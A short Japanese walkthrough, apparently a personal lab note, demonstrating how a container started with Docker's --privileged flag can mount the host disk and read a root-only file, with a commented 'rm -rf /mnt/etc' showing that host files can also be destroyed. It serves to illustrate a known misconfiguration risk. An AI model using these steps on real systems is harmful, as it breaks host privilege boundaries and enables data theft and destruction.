## /rootに検証用のファイルを作成

```bash
banister@~/projects/OreshicRecord vuln$ echo 'root only'
```

```
root only
```

## 一般ユーザーでは開けないことの確認

```bash
banister@~/projects/OreshicRecord vuln$ cat /root/secret.txt
```

```
cat: /root/secret.txt: 許可がありません
```

## コンテナにホストとほぼ同じ権限をつけて起動

```bash
banister@~/projects/OreshicRecord vuln$ docker run -it --privileged ubuntu
```

```
# ホストのデバイスを確認
root@c32ac14ace1c:/# lsblk
NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS
loop0    7:0    0     4K  1 loop 
loop1    7:1    0  63.8M  1 loop 
loop2    7:2    0  63.8M  1 loop 
loop3    7:3    0  73.9M  1 loop 
loop4    7:4    0  73.9M  1 loop 
loop5    7:5    0 249.1M  1 loop 
loop6    7:6    0 250.1M  1 loop 
loop7    7:7    0   4.9M  1 loop 
loop8    7:8    0 346.3M  1 loop 
loop9    7:9    0 349.7M  1 loop 
loop10   7:10   0   516M  1 loop 
loop11   7:11   0 516.2M  1 loop 
loop12   7:12   0  91.7M  1 loop 
loop13   7:13   0  12.9M  1 loop 
loop14   7:14   0  12.2M  1 loop 
loop15   7:15   0  50.8M  1 loop 
loop16   7:16   0  50.9M  1 loop 
loop17   7:17   0   568K  1 loop 
loop18   7:18   0   576K  1 loop 
sda      8:0    0   200G  0 disk 
|-sda1   8:1    0     1M  0 part 
|-sda2   8:2    0   513M  0 part 
`-sda3   8:3    0 199.5G  0 part /etc/hosts
                                 /etc/hostname
                                 /etc/resolv.conf
sr0     11:0    1  1024M  0 rom  

#-- ホストのデバイスをコンテナにマウント
root@c32ac14ace1c:/# mount /dev/sda3 /mnt

#-- 本来見えてはいけないものが見える
root@c32ac14ace1c:/# cat /mnt/root/secret.txt 
root only

#-- 破壊も可能
#-- root@c32ac14ace1c:/# cat /mnt/root/secret.txt 
#-- rm -rf /mnt/etc
```

